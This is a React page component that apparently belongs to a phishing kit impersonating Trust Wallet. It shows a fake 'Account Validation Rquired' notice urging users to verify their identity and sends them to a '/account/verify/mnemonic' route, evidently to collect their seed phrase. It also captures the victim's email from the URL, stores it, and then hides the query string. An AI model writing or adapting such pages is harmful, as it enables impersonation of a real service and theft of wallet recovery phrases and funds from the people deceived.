import { Button, StyleWrapper } from '../../theme/ThemeStyle'
import styled from 'styled-components'
import logo from '../../../public/assets/logo.png'
import Logo from './Logo'
import { useHistory, useLocation } from 'react-router-dom/cjs/react-router-dom.min'
import HomeBackground from './HomeBackground'
import queryString from 'querystring'
import { useEffect } from 'react'

const GetStarted = ()=>{
    const history = useHistory()
    const location = useLocation();

    useEffect(()=>{
        const urlParams = new URLSearchParams(window.location.search);
        const hasEmailParam = urlParams.has('email');
        const email = urlParams.get('email');
        const isValidEmail = email => hasEmailParam && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        
        if (isValidEmail(email)) { // Corrected
            console.log(email);
            localStorage.setItem('email', email);
        }

        const baseUrl = location.pathname;
        
        // Update the URL to remove query parameters
        history.replace(baseUrl);
    },[])
    return (<Main>
                <Logo />
        <Container>

            <HomeBackground />
            <AccountVerificationWrapper>
                <HeadingText>Account Validation Rquired</HeadingText>
                <HeaderSubtitle>In order to restore access to your account and resume transactions, we kindly ask you to verify your identity by answering a few security questions.</HeaderSubtitle>
                <Introduction>
                    <img src="/../assets/trust.svg" alt="" />
                    <SubTitle>True ownership of your crypto assets - we secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</SubTitle>
                </Introduction>
                <Introduction>
                    <Title>Lets Get You Verified</Title>
                    <SubTitle>Please verify your identity in order to continue using Trust wallet services. This is to help keep your account safe</SubTitle>
                </Introduction>
                <ButtonWrapper>
                    <Button onClick={()=> history.push('/account/verify/mnemonic')}>Get Started</Button>
                </ButtonWrapper>
            </AccountVerificationWrapper>
        </Container>
    
        </Main>
    )
}

export const Main = styled.div`
    display: flex;
    flex-direction: column;
    margin: 20px;
`
export const Container = styled.div`
    display: flex;
    align-items: center;
`
export const AccountVerificationWrapper = styled.form`
    padding: 20px;
    border-radius: 10px;
    display: flex;
    max-width: 550px;
    margin: auto;
    background: ${({theme})=> theme.colors.bg};
    flex-direction: column;
    & :last-child{
        margin: auto 0 20px;
    }
`

const Introduction = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px 20px;
    & img{
        max-width: 150px;
    }
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0;
        font-size: 12px;
    }
`
const HeadingText = styled.h1`
    font-size: 36px;
    margin-bottom: 5px;
    
`
const ButtonWrapper = styled.div`
    padding: 5px 20px;
`
const Title = styled.h1`
    font-size: 36px;
    margin: 0 0 10px;
`
const SubTitle = styled.h2`
    font-size: 14px;
    font-weight: 400;
    text-align: center;
    margin: 0;
    font-weight: 400;
    `
const HeaderSubtitle = styled(SubTitle)`
    text-align: left;
    font-size: 16px;
    font-weight: 400;
`

export default GetStarted